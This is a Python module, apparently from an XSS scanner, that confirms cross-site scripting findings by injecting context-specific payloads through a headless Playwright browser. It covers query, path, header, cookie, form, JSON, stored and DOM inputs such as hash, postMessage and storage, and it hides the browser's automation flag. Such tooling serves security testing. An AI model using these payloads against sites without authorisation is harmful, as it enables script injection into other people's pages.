from __future__ import annotations

import secrets
from urllib.parse import quote

from . import params


def new_marker() -> str:
    return "xq" + secrets.token_hex(5) + "qx"


def _payloads_for(context: str, m: str) -> list[str]:
    a = "alert('%s')" % m
    html = [
        '"><svg onload=%s>' % a,
        "'><svg onload=%s>" % a,
        '"><img src=x onerror=%s>' % a,
        "'><img src=x onerror=%s>" % a,
        "<svg onload=%s>" % a,
        "<img src=x onerror=%s>" % a,
        '"><body onload=%s>' % a,
        '"><details open ontoggle=%s>' % a,
        '"><script>%s</script>' % a,
        "<script>%s</script>" % a,
    ]
    attribute = [
        '"><svg onload=%s>' % a,
        '" onmouseover=%s x="' % a,
        '" autofocus onfocus=%s x="' % a,
        '" onpointerover=%s x="' % a,
        "'><svg onload=%s>" % a,
        "' onmouseover=%s x='" % a,
        "' autofocus onfocus=%s x='" % a,
    ]
    attribute_unquoted = [
        " onmouseover=%s " % a,
        " autofocus onfocus=%s " % a,
        " src=x onerror=%s " % a,
    ]
    script = [
        "';%s//" % a,
        '";%s//' % a,
        "'-%s-'" % a,
        '"-%s-"' % a,
        "'};%s;//" % a,
        "</script><svg onload=%s>" % a,
    ]
    uri = [
        "javascript:%s" % a,
        "jAvAsCrIpt:%s" % a,
        '"><svg onload=%s>' % a,
    ]
    comment = ["--><svg onload=%s>" % a, "--!><img src=x onerror=%s>" % a]
    rcdata = ["</textarea><svg onload=%s>" % a, "</title><img src=x onerror=%s>" % a]
    style = ["</style><svg onload=%s>" % a, "</style><script>%s</script>" % a]
    table = {
        "html": html,
        "json_reflection": html,
        "attribute": attribute,
        "attribute_unquoted": attribute_unquoted,
        "script": script,
        "uri": uri,
        "comment": comment,
        "rcdata": rcdata,
        "style": style,
    }
    return table.get(context, html)


def _finding_candidates(contexts, m: str, limit: int = 26) -> list[str]:
    order: list[str] = []
    for c in (list(contexts or []) + ["html", "attribute", "script", "uri"]):
        if c and c != "none" and c not in order:
            order.append(c)
    out: list[str] = []
    seen: set[str] = set()
    for c in order:
        for p in _payloads_for(c, m):
            if p not in seen:
                seen.add(p)
                out.append(p)
            if len(out) >= limit:
                return out
    return out


_JS_SINKS = ("eval(", "settimeout(", "setinterval(", "new function", ".src",
             ".href", "location.href", "location.assign", "location.replace",
             "document.write")


def _dom_candidates(js_sink: bool, m: str) -> list[str]:
    a = "alert('%s')" % m
    ar = "alert(/%s/.source)" % m
    markup = [
        "<img src=x onerror=%s>" % ar,
        "<svg onload=%s>" % ar,
        "<img src=x onerror=%s>" % a,
        "<svg onload=%s>" % a,
    ]
    js = [ar, a, ";%s//" % a, "-%s-" % a]
    return (js + markup) if js_sink else (markup + js)


HASH_SOURCES = ("location.hash", "location.href", "document.url", "document.documenturi")
SEARCH_SOURCES = ("location.search", "url.searchparams", "new urlsearchparams",
                  "location.href", "document.url")
NAME_SOURCES = ("window.name",)
MSG_SOURCES = ("postmessage", "onmessage")
COOKIE_SOURCES = ("document.cookie",)
STORAGE_SOURCES = ("localstorage", "sessionstorage")
COMMON_STORE_KEYS = ("xpars", "q", "search", "s", "redirect", "ref", "lang", "id",
                     "name", "msg", "data", "token", "next", "url", "returnurl",
                     "callback", "hash", "value")


def _dom_kinds(sources) -> list[str]:
    s = set(sources or [])
    out = []
    if s.intersection(HASH_SOURCES):
        out.append("hash")
    if s.intersection(SEARCH_SOURCES):
        out.append("search")
    if s.intersection(NAME_SOURCES):
        out.append("name")
    if s.intersection(MSG_SOURCES):
        out.append("message")
    if s.intersection(COOKIE_SOURCES):
        out.append("cookie")
    if s.intersection(STORAGE_SOURCES):
        out.append("storage")
    return out


_INIT_SCRIPT = r"""
(() => {
  window.__xd = window.__xd || [];
  const rec = (t, m) => { try { window.__xd.push({type: t, message: String(m)}); } catch(e){} };
  ['alert','confirm','prompt'].forEach((fn) => {
    try { window[fn] = function(x){ rec(fn, x === undefined ? '' : x);
      return fn === 'confirm' ? true : (fn === 'prompt' ? '' : undefined); }; } catch(e){}
  });
  try {
    Object.defineProperty(window, 'onbeforeunload', {get(){return null;}, set(){}, configurable:true});
    const oa = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function(t, f, o){
      if (String(t||'').toLowerCase() === 'beforeunload') return;
      return oa.call(this, t, f, o);
    };
  } catch(e){}
  try { Object.defineProperty(navigator, 'webdriver', {get:()=>false, configurable:true}); } catch(e){}
})();
"""

_TRIGGER_JS = r"""
() => {
  const o = {bubbles:true, cancelable:true, composed:true};
  const fire = (el, t) => { try { el.dispatchEvent(new Event(t, o)); } catch(e){} };
  const visit = (root) => {
    let els;
    try { els = Array.from(root.querySelectorAll('*')); } catch(e){ return; }
    for (const el of els) {
      try { if (el.tagName === 'DETAILS') el.open = true; } catch(e){}
      try { if (el.hasAttribute && el.hasAttribute('hidden')) el.removeAttribute('hidden'); } catch(e){}
      const names = el.getAttributeNames ? el.getAttributeNames() : [];
      for (const a of names) {
        if (a.length > 2 && a.slice(0,2).toLowerCase() === 'on') fire(el, a.slice(2));
      }
      try { if (typeof el.focus === 'function') el.focus(); } catch(e){}
      try { if (typeof el.click === 'function') el.click(); } catch(e){}
      try {
        const tn = (el.tagName || '').toLowerCase();
        if ((tn === 'animate' || tn === 'set' || tn === 'animatetransform')
            && typeof el.beginElement === 'function') el.beginElement();
      } catch(e){}
      try { if (el.shadowRoot) visit(el.shadowRoot); } catch(e){}
    }
    try {
      const forms = root.querySelectorAll ? root.querySelectorAll('form') : [];
      for (const f of forms) {
        try {
          const btns = f.querySelectorAll('[formaction]');
          for (const b of btns) {
            try {
              const ba = (b.getAttribute('formaction') || '').trim().toLowerCase();
              if (ba.indexOf('javascript:') === 0) b.click();
            } catch(e){}
          }
          const fa = (f.getAttribute('action') || '').trim().toLowerCase();
          if (fa.indexOf('javascript:') === 0) { try { f.submit(); } catch(e){} }
        } catch(e){}
      }
    } catch(e){}
  };
  try { visit(document); } catch(e){}
}
"""

_HASH_JS = ("() => { window.dispatchEvent(new HashChangeEvent('hashchange'));"
            " window.dispatchEvent(new PopStateEvent('popstate')); }")

_FORM_POST_JS = (
    "([a,n,v])=>{const f=document.createElement('form');f.method='POST';f.action=a;"
    "const i=document.createElement('input');i.name=n;i.value=v;f.appendChild(i);"
    "document.body.appendChild(f);f.submit();}")

_FETCH_WRITE_JS = (
    "async ([u,b,ct])=>{try{const r=await fetch(u,{method:'POST',"
    "headers:{'Content-Type':ct},body:b});const t=await r.text();"
    "document.open();document.write(t);document.close();}catch(e){}}")


def available() -> bool:
    try:
        import playwright.sync_api
        return True
    except Exception:
        return False


def _mk_handler(msgs):
    def handler(dialog):
        try:
            msgs.append(dialog.message)
        except Exception:
            pass
        try:
            dialog.dismiss()
        except Exception:
            pass
    return handler


class Engine:

    def __init__(self, timeout=8.0, headless=True, capture=False, storage_state=None):
        self.timeout = timeout
        self.headless = headless
        self.capture = capture
        self.storage_state = storage_state
        self._shot = None
        self._pw = None
        self.browser = None
        self.ctx = None

    def __enter__(self):
        from playwright.sync_api import sync_playwright
        self._pw = sync_playwright().start()
        self.browser = self._pw.chromium.launch(
            headless=self.headless,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
                  "--disable-blink-features=AutomationControlled",
                  "--disable-background-timer-throttling",
                  "--disable-renderer-backgrounding"],
        )
        if self.storage_state is not None:
            self.ctx = self.browser.new_context(ignore_https_errors=True,
                                                storage_state=self.storage_state)
        else:
            self.ctx = self.browser.new_context(ignore_https_errors=True)
        self.ctx.set_default_navigation_timeout(int(self.timeout * 1000))
        self.ctx.set_default_timeout(int(self.timeout * 1000))
        self.ctx.add_init_script(_INIT_SCRIPT)
        return self

    def __exit__(self, *exc):
        for closer in (lambda: self.ctx.close(), lambda: self.browser.close(),
                       lambda: self._pw.stop()):
            try:
                closer()
            except Exception:
                pass

    def _run(self, nav, interact=True, hashnav=False) -> list[str]:
        page = self.ctx.new_page()
        msgs: list[str] = []
        self._shot = None
        page.on("dialog", _mk_handler(msgs))
        try:
            nav(page)
            page.wait_for_timeout(300)
            if hashnav:
                try:
                    page.evaluate(_HASH_JS)
                except Exception:
                    pass
            if interact:
                for fr in page.frames:
                    try:
                        fr.evaluate(_TRIGGER_JS)
                    except Exception:
                        pass
                page.wait_for_timeout(200)
            try:
                prog = page.evaluate("window.__xd || []")
                for d in prog:
                    msgs.append(d.get("message", ""))
            except Exception:
                pass
            if self.capture and msgs:
                try:
                    import base64
                    self._shot = base64.b64encode(page.screenshot()).decode("ascii")
                except Exception:
                    self._shot = None
        except Exception:
            pass
        finally:
            try:
                page.close()
            except Exception:
                pass
        return msgs

    @staticmethod
    def _fired(msgs, marker) -> bool:
        return any(marker in (x or "") for x in msgs)

    def _inject(self, f, payload) -> list[str]:
        method = (f.get("method") or "GET").upper()
        url = f.get("url", "")
        name = f.get("param", "")

        if method in ("GET", "CSTI-GET"):
            try:
                target = params.set_param(url, name, payload)
            except Exception:
                return []
            return self._run(lambda p: p.goto(target, wait_until="domcontentloaded"))

        if method == "PATH":
            idx = f.get("path_index")
            try:
                target = params.set_path_segment(url, idx, quote(payload, safe=""))
            except Exception:
                return []
            return self._run(lambda p: p.goto(target, wait_until="domcontentloaded"))

        if method == "HEADER":
            try:
                self.ctx.set_extra_http_headers({name: payload})
            except Exception:
                return []
            try:
                return self._run(lambda p: p.goto(url, wait_until="domcontentloaded"))
            finally:
                try:
                    self.ctx.set_extra_http_headers({})
                except Exception:
                    pass

        if method == "COOKIE":
            try:
                self.ctx.clear_cookies()
                self.ctx.add_cookies([{"name": "xpars", "value": payload, "url": url}])
            except Exception:
                return []
            try:
                return self._run(lambda p: p.goto(url, wait_until="domcontentloaded"))
            finally:
                try:
                    self.ctx.clear_cookies()
                except Exception:
                    pass

        if method == "POST":
            def nav(p):
                p.goto("about:blank")
                p.evaluate(_FORM_POST_JS, [url, name, payload])
            return self._run(nav)

        if method in ("POST-JSON", "GRAPHQL"):
            import json as _json
            from . import jsontpl
            tpl = f.get("json_template")
            jp = f.get("json_path")
            if tpl is not None and jp is not None:
                body = _json.dumps(jsontpl.set_at(tpl, tuple(jp), payload))
            else:
                body = _json.dumps({name: payload})

            def nav(p):
                p.goto(url.split("#")[0], wait_until="domcontentloaded")
                p.evaluate(_FETCH_WRITE_JS, [url, body, "application/json"])
            return self._run(nav)

        if method == "STORED":
            smethod = (f.get("source_method") or "GET").upper()
            surl = f.get("source_url", url)
            sname = f.get("param", name)
            if smethod == "POST":
                self._run(lambda p: (p.goto("about:blank"),
                                     p.evaluate(_FORM_POST_JS, [surl, sname, payload])),
                          interact=False)
            else:
                try:
                    tgt = params.set_param(surl, sname, payload)
                except Exception:
                    tgt = surl
                self._run(lambda p: p.goto(tgt, wait_until="domcontentloaded"),
                          interact=False)
            return self._run(lambda p: p.goto(url, wait_until="domcontentloaded"))

        try:
            target = params.set_param(url, name, payload)
        except Exception:
            return []
        return self._run(lambda p: p.goto(target, wait_until="domcontentloaded"))

    def confirm_finding(self, f) -> bool:
        m = new_marker()
        contexts = f.get("contexts") or ([f.get("context")] if f.get("context") else [])
        for payload in _finding_candidates(contexts, m):
            if self._fired(self._inject(f, payload), m):
                f["verified"] = True
                f["how"] = "browser-execution"
                f["severity"] = "critical"
                f["verified_payload"] = payload
                f["payload"] = payload
                f["confirm_marker"] = m
                if self._shot:
                    f["screenshot"] = "data:image/png;base64," + self._shot
                return True
        f["verified"] = False
        return False

    def _dom_inject(self, base, kind, payload) -> list[str]:
        if kind == "hash":
            return self._run(lambda p: p.goto(base + "#" + payload,
                                              wait_until="domcontentloaded"),
                             hashnav=True)
        if kind == "search":
            sep = "&" if "?" in base else "?"
            return self._run(lambda p: p.goto(base + sep + "xpars=" + quote(payload, safe=""),
                                              wait_until="domcontentloaded"))
        if kind == "name":
            def nav(p):
                p.goto("about:blank")
                p.evaluate("(v)=>{window.name=v;}", payload)
                p.goto(base, wait_until="domcontentloaded")
            return self._run(nav)
        if kind == "message":
            def nav(p):
                p.goto(base, wait_until="domcontentloaded")
                p.wait_for_timeout(250)
                p.evaluate("(v)=>{window.postMessage(v,'*');}", payload)
                p.evaluate("(v)=>{try{window.postMessage({type:'message',data:v,"
                           "message:v,text:v,html:v},'*');}catch(e){}}", payload)
            return self._run(nav)
        if kind == "cookie":
            try:
                self.ctx.clear_cookies()
                self.ctx.add_cookies([{"name": k, "value": payload, "url": base}
                                      for k in COMMON_STORE_KEYS])
            except Exception:
                return []
            try:
                return self._run(lambda p: p.goto(base, wait_until="domcontentloaded"))
            finally:
                try:
                    self.ctx.clear_cookies()
                except Exception:
                    pass
        if kind == "storage":
            def nav(p):
                p.goto(base, wait_until="domcontentloaded")
                p.evaluate("([ks,v])=>{try{for(const k of ks){"
                           "localStorage.setItem(k,v);sessionStorage.setItem(k,v);}}"
                           "catch(e){}}", [list(COMMON_STORE_KEYS), payload])
                p.goto(base, wait_until="domcontentloaded")
            return self._run(nav)
        return []

    def confirm_dom(self, d) -> bool:
        kinds = _dom_kinds(d.get("sources", []))
        base = (d.get("url") or "").split("#")[0]
        if not kinds or not base:
            d["verified"] = False
            return False
        js_sink = any(s in _JS_SINKS for s in d.get("sinks", []))
        m = new_marker()
        for kind in kinds:
            for payload in _dom_candidates(js_sink, m):
                if self._fired(self._dom_inject(base, kind, payload), m):
                    d["verified"] = True
                    d["how"] = "dom-execution"
                    d["severity"] = "high"
                    d["verified_payload"] = payload
                    d["verified_via"] = kind
                    d["payload"] = payload
                    d["poc"] = (base + "#" + payload) if kind == "hash" else base
                    d["confirm_marker"] = m
                    return True
        d["verified"] = False
        return False


VERIFY_METHODS = ("GET", "CSTI-GET", "PATH", "POST", "POST-JSON", "GRAPHQL",
                  "HEADER", "COOKIE", "STORED")


def run(findings, dom=None, timeout=8.0, headless=True, capture=False,
        storage_state=None) -> dict:
    dom = dom or []
    f_targets = [f for f in findings if (f.get("method") or "GET").upper() in VERIFY_METHODS]
    d_targets = [d for d in dom if _dom_kinds(d.get("sources", []))]
    summary = {
        "supported": available(),
        "confirmed": 0, "candidates": len(f_targets),
        "dom_confirmed": 0, "dom_candidates": len(d_targets),
    }
    if not summary["supported"] or (not f_targets and not d_targets):
        return summary
    with Engine(timeout=timeout, headless=headless, capture=capture,
                storage_state=storage_state) as eng:
        for f in f_targets:
            try:
                if eng.confirm_finding(f):
                    summary["confirmed"] += 1
            except Exception:
                f["verified"] = False
        for d in d_targets:
            try:
                if eng.confirm_dom(d):
                    summary["dom_confirmed"] += 1
            except Exception:
                d["verified"] = False
    return summary
